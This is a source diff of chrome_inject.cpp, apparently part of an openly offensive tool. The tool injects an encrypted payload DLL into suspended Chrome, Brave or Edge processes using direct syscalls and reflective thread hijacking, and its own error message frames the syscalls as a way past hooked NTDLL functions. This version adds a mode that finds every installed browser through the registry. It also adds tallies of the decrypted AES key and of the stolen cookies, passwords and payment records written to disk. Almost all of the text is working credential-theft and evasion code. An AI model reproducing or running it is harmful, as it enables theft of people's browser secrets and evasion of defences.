@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.14.2 (c) Alexander 'xaitax' Hagenah
+// v0.15.0 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -8,7 +8,6 @@
 #include <string>
 #include <vector>
 #include <sstream>
-#include <iomanip>
 #include <filesystem>
 #include <optional>
 #include <map>
@@ -22,9 +21,6 @@
 #include "..\libs\chacha\chacha20.h"
 
 #pragma comment(lib, "Rpcrt4.lib")
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "version.lib")
-#pragma comment(lib, "user32.lib")
 
 #ifndef IMAGE_FILE_MACHINE_AMD64
 #define IMAGE_FILE_MACHINE_AMD64 0x8664
@@ -40,6 +36,7 @@
 namespace
 {
     constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
+    constexpr const char *APP_VERSION = "v0.15.0";
 
     const uint8_t g_decryptionKey[32] = {
         0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
@@ -58,7 +55,7 @@ namespace
         void operator()(HANDLE h) const
         {
             if (h && h != INVALID_HANDLE_VALUE)
-                CloseHandle(h);
+                NtClose_syscall(h);
         }
     };
     using UniqueHandle = std::unique_ptr<void, HandleDeleter>;
@@ -99,6 +96,15 @@ namespace
             RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
             return pipeName;
         }
+
+        std::string Capitalize(const std::string &str)
+        {
+            if (str.empty())
+                return str;
+            std::string result = str;
+            result[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(result[0])));
+            return result;
+        }
     }
 }
 
@@ -115,11 +121,15 @@ public:
     void displayBanner() const
     {
         SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
-        std::cout << "------------------------------------------------\n"
-                  << "|  Chrome App-Bound Encryption Decryption      |\n"
-                  << "|  Direct Syscall-Based Reflective Hollowing   |\n"
-                  << "|  x64 & ARM64 | v0.14.1 by @xaitax            |\n"
-                  << "------------------------------------------------\n\n";
+        std::cout << "_________ .__                         ___________.__                       __                \n"
+                  << "\\_   ___ \\|  |_________  ____   _____ \\_   _____/|  |   _______  _______ _/  |_  ___________ \n"
+                  << "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\ |    __)_ |  | _/ __ \\  \\/ /\\__  \\\\   __\\/  _ \\_  __ \\\n"
+                  << "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\|        \\|  |_\\  ___/\\   /  / __ \\|  | (  <_> )  | \\/\n"
+                  << " \\______  /___|  /__|   \\____/|__|_|  /_______  /|____/\\___  >\\_/  (____  /__|  \\____/|__|   \n"
+                  << "        \\/     \\/                   \\/        \\/           \\/           \\/                   \n\n"
+                  << " Direct Syscall-Based Reflective Hollowing\n"
+                  << " x64 & ARM64 | " << APP_VERSION << " by @xaitax"
+                  << "\n\n";
         ResetColor();
     }
 
@@ -127,11 +137,16 @@ public:
     {
         SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
         std::wcout << L"Usage:\n"
-                   << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
+                   << L"  chrome_inject.exe [options] <chrome|brave|edge|all>\n\n"
                    << L"Options:\n"
                    << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                    << L"  --verbose|-v             Enable verbose debug output from the injector\n"
-                   << L"  --help|-h                Show this help message\n";
+                   << L"  --help|-h                Show this help message\n\n"
+                   << L"Browser targets:\n"
+                   << L"  chrome  - Extract from Google Chrome\n"
+                   << L"  brave   - Extract from Brave Browser\n"
+                   << L"  edge    - Extract from Microsoft Edge\n"
+                   << L"  all     - Extract from all installed browsers\n";
         ResetColor();
     }
 
@@ -153,6 +168,7 @@ public:
         {
             std::cout << message.substr(0, tagStart);
             std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
+
             WORD color = m_originalAttributes;
             if (tag == "[+]")
                 color = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
@@ -162,6 +178,7 @@ public:
                 color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
             else if (tag == "[!]")
                 color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+
             SetColor(color);
             std::cout << tag;
             ResetColor();
@@ -172,6 +189,8 @@ public:
             std::cout << message << std::endl;
         }
     }
+
+    bool m_verbose;
 
 private:
     void print(const std::string &tag, const std::string &msg, WORD color) const
@@ -184,9 +203,139 @@ private:
     void SetColor(WORD attributes) const { SetConsoleTextAttribute(m_hConsole, attributes); }
     void ResetColor() const { SetConsoleTextAttribute(m_hConsole, m_originalAttributes); }
 
-    bool m_verbose;
     HANDLE m_hConsole;
     WORD m_originalAttributes;
+};
+
+class BrowserPathResolver
+{
+public:
+    explicit BrowserPathResolver(const Console &console) : m_console(console) {}
+
+    std::wstring resolve(const std::wstring &browserExeName)
+    {
+        m_console.Debug("Searching Registry for: " + Utils::WStringToUtf8(browserExeName));
+
+        const std::wstring registryPaths[] = {
+            L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName,
+            L"\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName};
+
+        for (const auto &regPath : registryPaths)
+        {
+            std::wstring path = queryRegistryDefaultValue(regPath);
+            if (!path.empty() && fs::exists(path))
+            {
+                m_console.Debug("Found at: " + Utils::WStringToUtf8(path));
+                return path;
+            }
+        }
+
+        m_console.Debug("Not found in Registry");
+        return L"";
+    }
+
+    std::vector<std::pair<std::wstring, std::wstring>> findAllInstalledBrowsers()
+    {
+        std::vector<std::pair<std::wstring, std::wstring>> installedBrowsers;
+
+        const std::pair<std::wstring, std::wstring> supportedBrowsers[] = {
+            {L"chrome", L"chrome.exe"},
+            {L"edge", L"msedge.exe"},
+            {L"brave", L"brave.exe"}};
+
+        m_console.Debug("Enumerating installed browsers...");
+
+        for (const auto &[browserType, exeName] : supportedBrowsers)
+        {
+            std::wstring path = resolve(exeName);
+            if (!path.empty())
+            {
+                installedBrowsers.push_back({browserType, path});
+                m_console.Debug("Found " + Utils::Capitalize(Utils::WStringToUtf8(browserType)) + " at: " + Utils::WStringToUtf8(path));
+            }
+        }
+
+        if (installedBrowsers.empty())
+            m_console.Warn("No supported browsers found installed on this system");
+        else
+            m_console.Debug("Found " + std::to_string(installedBrowsers.size()) + " browser(s) to process");
+
+        return installedBrowsers;
+    }
+
+private:
+    std::wstring queryRegistryDefaultValue(const std::wstring &keyPath)
+    {
+        std::vector<wchar_t> pathBuffer(keyPath.begin(), keyPath.end());
+        pathBuffer.push_back(L'\0');
+
+        UNICODE_STRING_SYSCALLS keyName;
+        keyName.Buffer = pathBuffer.data();
+        keyName.Length = static_cast<USHORT>(keyPath.length() * sizeof(wchar_t));
+        keyName.MaximumLength = static_cast<USHORT>(pathBuffer.size() * sizeof(wchar_t));
+
+        OBJECT_ATTRIBUTES objAttr;
+        InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+
+        HANDLE hKey = nullptr;
+        NTSTATUS status = NtOpenKey_syscall(&hKey, KEY_READ, &objAttr);
+
+        if (!NT_SUCCESS(status))
+        {
+            if (status != (NTSTATUS)0xC0000034) // STATUS_OBJECT_NAME_NOT_FOUND
+                m_console.Debug("Registry access failed: " + Utils::NtStatusToString(status));
+            return L"";
+        }
+
+        UniqueHandle keyGuard(hKey);
+
+        UNICODE_STRING_SYSCALLS valueName = {0, 0, nullptr};
+        ULONG bufferSize = 4096;
+        std::vector<BYTE> buffer(bufferSize);
+        ULONG resultLength = 0;
+
+        status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
+                                         buffer.data(), bufferSize, &resultLength);
+
+        if (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_BUFFER_OVERFLOW)
+        {
+            buffer.resize(resultLength);
+            bufferSize = resultLength;
+            status = NtQueryValueKey_syscall(hKey, &valueName, KeyValuePartialInformation,
+                                             buffer.data(), bufferSize, &resultLength);
+        }
+
+        if (!NT_SUCCESS(status))
+            return L"";
+
+        auto kvpi = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buffer.data());
+
+        if (kvpi->Type != REG_SZ && kvpi->Type != REG_EXPAND_SZ)
+            return L"";
+        if (kvpi->DataLength < sizeof(wchar_t) * 2)
+            return L"";
+
+        size_t charCount = kvpi->DataLength / sizeof(wchar_t);
+        std::wstring path(reinterpret_cast<wchar_t *>(kvpi->Data), charCount);
+
+        while (!path.empty() && path.back() == L'\0')
+            path.pop_back();
+
+        if (path.empty())
+            return L"";
+
+        if (kvpi->Type == REG_EXPAND_SZ)
+        {
+            std::vector<wchar_t> expanded(MAX_PATH * 2);
+            DWORD size = ExpandEnvironmentStringsW(path.c_str(), expanded.data(), static_cast<DWORD>(expanded.size()));
+            if (size > 0 && size <= expanded.size())
+                path = std::wstring(expanded.data());
+        }
+
+        return path;
+    }
+
+    const Console &m_console;
 };
 
 struct Configuration
@@ -198,7 +347,7 @@ struct Configuration
     std::wstring browserDefaultExePath;
     std::string browserDisplayName;
 
-    [[nodiscard]] static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
+    static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
     {
         Configuration config;
         fs::path customOutputPath;
@@ -229,30 +378,34 @@ struct Configuration
             console.printUsage();
             return std::nullopt;
         }
+
         std::transform(config.browserType.begin(), config.browserType.end(), config.browserType.begin(), ::towlower);
 
-        static const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
-            {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
-            {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
-            {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};
+        static const std::map<std::wstring, std::wstring> browserExeMap = {
+            {L"chrome", L"chrome.exe"},
+            {L"brave", L"brave.exe"},
+            {L"edge", L"msedge.exe"}};
 
-        auto it = browserMap.find(config.browserType);
-        if (it == browserMap.end())
+        auto it = browserExeMap.find(config.browserType);
+        if (it == browserExeMap.end())
         {
             console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
             return std::nullopt;
         }
 
-        config.browserProcessName = it->second.first;
-        config.browserDefaultExePath = it->second.second;
+        config.browserProcessName = it->second;
 
-        std::string displayName = Utils::WStringToUtf8(config.browserType);
-        if (!displayName.empty())
+        BrowserPathResolver resolver(console);
+        config.browserDefaultExePath = resolver.resolve(config.browserProcessName);
+
+        if (config.browserDefaultExePath.empty())
         {
-            displayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(displayName[0])));
+            console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + " installation in Registry");
+            console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + " is properly installed");
+            return std::nullopt;
         }
-        config.browserDisplayName = displayName;
 
+        config.browserDisplayName = Utils::Capitalize(Utils::WStringToUtf8(config.browserType));
         config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);
 
         return config;
@@ -266,26 +419,22 @@ public:
 
     void createSuspended()
     {
-        m_console.Info("Creating suspended " + m_config.browserDisplayName + " process.");
+        m_console.Debug("Creating suspended " + m_config.browserDisplayName + " process.");
         m_console.Debug("Target executable path: " + Utils::WStringToUtf8(m_config.browserDefaultExePath));
 
         STARTUPINFOW si{};
         PROCESS_INFORMATION pi{};
         si.cb = sizeof(si);
 
-        if (!CreateProcessW(
-                m_config.browserDefaultExePath.c_str(), nullptr,
-                nullptr, nullptr, FALSE, CREATE_SUSPENDED,
-                nullptr, nullptr, &si, &pi))
-        {
+        if (!CreateProcessW(m_config.browserDefaultExePath.c_str(), nullptr, nullptr, nullptr,
+                            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
             throw std::runtime_error("CreateProcessW failed. Error: " + std::to_string(GetLastError()));
-        }
 
         m_hProcess.reset(pi.hProcess);
         m_hThread.reset(pi.hThread);
         m_pid = pi.dwProcessId;
 
-        m_console.Success("Created suspended process PID: " + std::to_string(m_pid));
+        m_console.Debug("Created suspended process PID: " + std::to_string(m_pid));
         checkArchitecture();
     }
 
@@ -295,12 +444,11 @@ public:
         {
             m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
             NtTerminateProcess_syscall(m_hProcess.get(), 0);
-            m_console.Info(m_config.browserDisplayName + " terminated by injector.");
+            m_console.Debug(m_config.browserDisplayName + " terminated by injector.");
         }
     }
 
     HANDLE getProcessHandle() const { return m_hProcess.get(); }
-    USHORT getArch() const { return m_arch; }
 
 private:
     void checkArchitecture()
@@ -308,9 +456,7 @@ private:
         USHORT processArch = 0, nativeMachine = 0;
         auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
         if (!fnIsWow64Process2 || !fnIsWow64Process2(m_hProcess.get(), &processArch, &nativeMachine))
-        {
             throw std::runtime_error("Failed to determine target process architecture.");
-        }
 
         m_arch = (processArch == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processArch;
 
@@ -324,10 +470,11 @@ private:
 #endif
 
         if (m_arch != injectorArch)
-        {
-            throw std::runtime_error("Architecture mismatch. Injector is " + std::string(getArchName(injectorArch)) + " but target is " + std::string(getArchName(m_arch)));
-        }
-        m_console.Debug("Architecture match: Injector=" + std::string(getArchName(injectorArch)) + ", Target=" + std::string(getArchName(m_arch)));
+            throw std::runtime_error("Architecture mismatch. Injector is " + std::string(getArchName(injectorArch)) +
+                                     " but target is " + std::string(getArchName(m_arch)));
+
+        m_console.Debug("Architecture match: Injector=" + std::string(getArchName(injectorArch)) +
+                        ", Target=" + std::string(getArchName(m_arch)));
     }
 
     const char *getArchName(USHORT arch) const
@@ -356,6 +503,15 @@ private:
 class PipeCommunicator
 {
 public:
+    struct ExtractionStats
+    {
+        int totalCookies = 0;
+        int totalPasswords = 0;
+        int totalPayments = 0;
+        int profileCount = 0;
+        std::string aesKey;
+    };
+
     PipeCommunicator(const std::wstring &pipeName, const Console &console) : m_pipeName(pipeName), m_console(console) {}
 
     void create()
@@ -364,9 +520,8 @@ public:
                                             PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                             1, 4096, 4096, 0, nullptr));
         if (!m_pipeHandle)
-        {
             throw std::runtime_error("CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
-        }
+
         m_console.Debug("Named pipe server created: " + Utils::WStringToUtf8(m_pipeName));
     }
 
@@ -374,9 +529,8 @@ public:
     {
         m_console.Debug("Waiting for payload to connect to named pipe.");
         if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
-        {
             throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
-        }
+
         m_console.Debug("Payload connected to named pipe.");
     }
 
@@ -388,8 +542,10 @@ public:
 
     void relayMessages()
     {
-        m_console.Info("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");
-        std::cout << std::endl;
+        m_console.Debug("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");
+
+        if (m_console.m_verbose)
+            std::cout << std::endl;
 
         const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
         DWORD startTime = GetTickCount();
@@ -407,6 +563,7 @@ public:
                 m_console.Error("PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
                 break;
             }
+
             if (bytesAvailable == 0)
             {
                 Sleep(100);
@@ -436,17 +593,24 @@ public:
                     completed = true;
                     break;
                 }
-                if (!message.empty())
+
+                parseExtractionMessage(message);
+
+                if (!message.empty() && m_console.m_verbose)
                     m_console.Relay(message);
             }
             if (completed)
                 break;
             accumulatedData.erase(0, messageStart);
         }
-        std::cout << std::endl;
-        m_console.Success("Payload signaled completion or pipe interaction ended.");
+
+        if (m_console.m_verbose)
+            std::cout << std::endl;
+
+        m_console.Debug("Payload signaled completion or pipe interaction ended.");
     }
 
+    const ExtractionStats &getStats() const { return m_stats; }
     const std::wstring &getName() const { return m_pipeName; }
 
 private:
@@ -455,22 +619,62 @@ private:
         DWORD bytesWritten = 0;
         if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
             bytesWritten != (msg.length() + 1))
-        {
             throw std::runtime_error("WriteFile to pipe failed for message: " + msg);
-        }
+
         m_console.Debug("Sent message to pipe: " + msg);
+    }
+
+    void parseExtractionMessage(const std::string &message)
+    {
+        // Helper lambda to extract numeric value from pattern
+        auto extractNumber = [&message](const std::string &prefix, const std::string &suffix) -> int
+        {
+            size_t start = message.find(prefix);
+            if (start == std::string::npos)
+                return 0;
+            start += prefix.length();
+            size_t end = message.find(suffix, start);
+            if (end == std::string::npos)
+                return 0;
+            try
+            {
+                return std::stoi(message.substr(start, end - start));
+            }
+            catch (...)
+            {
+                return 0;
+            }
+        };
+
+        // Parse profile count
+        if (message.find("Found ") != std::string::npos && message.find("profile(s)") != std::string::npos)
+            m_stats.profileCount = extractNumber("Found ", " profile(s)");
+
+        // Parse AES key
+        if (message.find("Decrypted AES Key: ") != std::string::npos)
+            m_stats.aesKey = message.substr(message.find("Decrypted AES Key: ") + 19);
+
+        // Parse extraction counts
+        if (message.find(" cookies extracted to ") != std::string::npos)
+            m_stats.totalCookies += extractNumber("[*] ", " cookies");
+
+        if (message.find(" passwords extracted to ") != std::string::npos)
+            m_stats.totalPasswords += extractNumber("[*] ", " passwords");
+
+        if (message.find(" payments extracted to ") != std::string::npos)
+            m_stats.totalPayments += extractNumber("[*] ", " payments");
     }
 
     std::wstring m_pipeName;
     const Console &m_console;
     UniqueHandle m_pipeHandle;
+    ExtractionStats m_stats;
 };
 
 class InjectionManager
 {
 public:
-    InjectionManager(TargetProcess &target, const Console &console)
-        : m_target(target), m_console(console) {}
+    InjectionManager(TargetProcess &target, const Console &console) : m_target(target), m_console(console) {}
 
     void execute(const std::wstring &pipeName)
     {
@@ -489,32 +693,35 @@ public:
         SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
         SIZE_T totalAllocationSize = payloadDllSize + pipeNameByteSize;
 
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0, &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0,
+                                                          &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
         m_console.Debug("Combined memory for payload and parameters allocated at: " + Utils::PtrToHexStr(remoteDllBase));
 
         m_console.Debug("Writing payload DLL to target process.");
         SIZE_T bytesWritten = 0;
-        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase, m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
+        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase,
+                                              m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtWriteVirtualMemory for payload DLL failed: " + Utils::NtStatusToString(status));
 
         m_console.Debug("Writing pipe name parameter into the same allocation.");
         LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
-        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr, (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
+        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr,
+                                              (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
 
         m_console.Debug("Changing payload memory protection to executable.");
         ULONG oldProtect = 0;
-        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
+        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase,
+                                                &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));
 
         startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);
-
-        m_console.Success("New thread created for payload. Main thread remains suspended.");
+        m_console.Debug("New thread created for payload. Main thread remains suspended.");
     }
 
 private:
@@ -600,9 +807,7 @@ private:
         UniqueHandle remoteThreadGuard(hRemoteThread);
 
         if (!NT_SUCCESS(status))
-        {
             throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));
-        }
 
         m_console.Debug("Successfully created new thread for payload.");
     }
@@ -612,9 +817,39 @@ private:
     std::vector<BYTE> m_decryptedDllPayload;
 };
 
+// Helper function to build extraction summary string
+std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats &stats)
+{
+    std::stringstream summary;
+    std::vector<std::string> items;
+
+    if (stats.totalCookies > 0)
+        items.push_back(std::to_string(stats.totalCookies) + " cookies");
+    if (stats.totalPasswords > 0)
+        items.push_back(std::to_string(stats.totalPasswords) + " passwords");
+    if (stats.totalPayments > 0)
+        items.push_back(std::to_string(stats.totalPayments) + " payments");
+
+    if (!items.empty())
+    {
+        summary << "Extracted ";
+        for (size_t i = 0; i < items.size(); ++i)
+        {
+            if (i > 0 && i == items.size() - 1)
+                summary << " and ";
+            else if (i > 0)
+                summary << ", ";
+            summary << items[i];
+        }
+        summary << " from " << stats.profileCount << " profile" << (stats.profileCount != 1 ? "s" : "");
+    }
+
+    return summary.str();
+}
+
 void KillBrowserNetworkService(const Configuration &config, const Console &console)
 {
-    console.Info("Scanning for and terminating browser network services...");
+    console.Debug("Scanning for and terminating browser network services...");
 
     UniqueHandle hCurrentProc;
     HANDLE nextProcHandle = nullptr;
@@ -651,7 +886,7 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
         if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
         {
-            console.Success("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
+            console.Debug("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
             NtTerminateProcess_syscall(hCurrentProc.get(), 0);
             processes_terminated++;
         }
@@ -659,12 +894,12 @@ void KillBrowserNetworkService(const Configuration &config, const Console &conso
 
     if (processes_terminated > 0)
     {
-        console.Info("Termination sweep complete. Waiting for file locks to fully release.");
+        console.Debug("Termination sweep complete. Waiting for file locks to fully release.");
         Sleep(1500);
     }
 }
 
-void RunInjectionWorkflow(const Configuration &config, const Console &console)
+PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration &config, const Console &console)
 {
     KillBrowserNetworkService(config, console);
 
@@ -682,50 +917,221 @@ void RunInjectionWorkflow(const Configuration &config, const Console &console)
     pipe.relayMessages();
 
     target.terminate();
+
+    return pipe.getStats();
+}
+
+void DisplayExtractionSummary(const std::string &browserName, const PipeCommunicator::ExtractionStats &stats,
+                              const Console &console, bool singleBrowser, const fs::path &outputPath)
+{
+    if (singleBrowser)
+    {
+        if (!stats.aesKey.empty())
+            console.Success("AES Key: " + stats.aesKey);
+
+        std::string summary = BuildExtractionSummary(stats);
+        if (!summary.empty())
+        {
+            console.Success(summary);
+            console.Success("Stored in " + (outputPath / browserName).u8string());
+        }
+        else
+        {
+            console.Warn("No data extracted");
+        }
+    }
+    else
+    {
+        console.Info(browserName);
+
+        if (!stats.aesKey.empty())
+            console.Success("AES Key: " + stats.aesKey);
+
+        std::string summary = BuildExtractionSummary(stats);
+        if (!summary.empty())
+        {
+            console.Success(summary);
+            console.Success("Stored in " + (outputPath / browserName).u8string());
+        }
+        else
+        {
+            console.Warn("No data extracted");
+        }
+    }
+}
+
+void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &outputPath)
+{
+    if (verbose)
+        console.Info("Starting multi-browser extraction...");
+
+    BrowserPathResolver resolver(console);
+    auto installedBrowsers = resolver.findAllInstalledBrowsers();
+
+    if (installedBrowsers.empty())
+    {
+        console.Error("No supported browsers found on this system");
+        return;
+    }
+
+    if (!verbose)
+        console.Info("Processing " + std::to_string(installedBrowsers.size()) + " browser(s):\n");
+
+    int successCount = 0;
+    int failCount = 0;
+
+    for (size_t i = 0; i < installedBrowsers.size(); ++i)
+    {
+        const auto &[browserType, browserPath] = installedBrowsers[i];
+
+        Configuration config;
+        config.verbose = verbose;
+        config.outputPath = outputPath;
+        config.browserType = browserType;
+        config.browserDefaultExePath = browserPath;
+
+        // Map browser type to process name
+        static const std::map<std::wstring, std::pair<std::wstring, std::string>> browserMap = {
+            {L"chrome", {L"chrome.exe", "Chrome"}},
+            {L"edge", {L"msedge.exe", "Edge"}},
+            {L"brave", {L"brave.exe", "Brave"}}};
+
+        auto it = browserMap.find(browserType);
+        if (it != browserMap.end())
+        {
+            config.browserProcessName = it->second.first;
+            config.browserDisplayName = it->second.second;
+        }
+
+        if (verbose)
+        {
+            console.Info("\n[Browser " + std::to_string(i + 1) + "/" + std::to_string(installedBrowsers.size()) +
+                         "] Processing " + config.browserDisplayName);
+        }
+
+        try
+        {
+            auto stats = RunInjectionWorkflow(config, console);
+            successCount++;
+
+            if (verbose)
+            {
+                console.Success(config.browserDisplayName + " extraction completed");
+            }
+            else
+            {
+                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, config.outputPath);
+                if (i < installedBrowsers.size() - 1)
+                    std::cout << std::endl;
+            }
+        }
+        catch (const std::exception &e)
+        {
+            failCount++;
+
+            if (verbose)
+            {
+                console.Error(config.browserDisplayName + " extraction failed: " + std::string(e.what()));
+            }
+            else
+            {
+                console.Info(config.browserDisplayName);
+                console.Error("Extraction failed");
+                if (i < installedBrowsers.size() - 1)
+                    std::cout << std::endl;
+            }
+        }
+    }
+
+    std::cout << std::endl;
+    console.Info("Completed: " + std::to_string(successCount) + " successful, " + std::to_string(failCount) + " failed");
 }
 
 int wmain(int argc, wchar_t *argv[])
 {
     bool isVerbose = false;
+    std::wstring browserTarget;
+    fs::path outputPath;
+
+    // Parse arguments
     for (int i = 1; i < argc; ++i)
     {
-        if (std::wstring_view(argv[i]) == L"--verbose" || std::wstring_view(argv[i]) == L"-v")
-        {
+        std::wstring_view arg = argv[i];
+        if (arg == L"--verbose" || arg == L"-v")
             isVerbose = true;
-            break;
+        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
+            outputPath = argv[++i];
+        else if (arg == L"--help" || arg == L"-h")
+        {
+            Console(false).displayBanner();
+            Console(false).printUsage();
+            return 0;
         }
+        else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
+            browserTarget = arg;
     }
+
     Console console(isVerbose);
     console.displayBanner();
 
-    auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
-    if (!optConfig)
+    if (browserTarget.empty())
     {
-        return (argc > 1 && (std::wstring_view(argv[1]) == L"--help" || std::wstring_view(argv[1]) == L"-h")) ? 0 : 1;
+        console.printUsage();
+        return 0;
     }
 
-    if (!InitializeSyscalls(optConfig->verbose))
+    if (!InitializeSyscalls(isVerbose))
     {
         console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
         return 1;
     }
 
+    if (outputPath.empty())
+        outputPath = fs::current_path() / "output";
+
     std::error_code ec;
-    fs::create_directories(optConfig->outputPath, ec);
+    fs::create_directories(outputPath, ec);
     if (ec)
     {
-        console.Error("Failed to create output directory: " + optConfig->outputPath.u8string() + ". Error: " + ec.message());
+        console.Error("Failed to create output directory: " + outputPath.u8string() + ". Error: " + ec.message());
         return 1;
     }
 
-    try
+    if (browserTarget == L"all")
     {
-        RunInjectionWorkflow(*optConfig, console);
+        try
+        {
+            ProcessAllBrowsers(console, isVerbose, outputPath);
+        }
+        catch (const std::exception &e)
+        {
+            console.Error(e.what());
+            return 1;
+        }
     }
-    catch (const std::runtime_error &e)
+    else
     {
-        console.Error(e.what());
-        return 1;
+        auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
+        if (!optConfig)
+            return 1;
+
+        try
+        {
+            if (!isVerbose)
+                console.Info("Processing " + optConfig->browserDisplayName + "...\n");
+
+            auto stats = RunInjectionWorkflow(*optConfig, console);
+
+            if (!isVerbose)
+                DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true, optConfig->outputPath);
+            else
+                console.Success("\nExtraction completed successfully");
+        }
+        catch (const std::runtime_error &e)
+        {
+            console.Error(e.what());
+            return 1;
+        }
     }
 
     console.Debug("Injector finished successfully.");
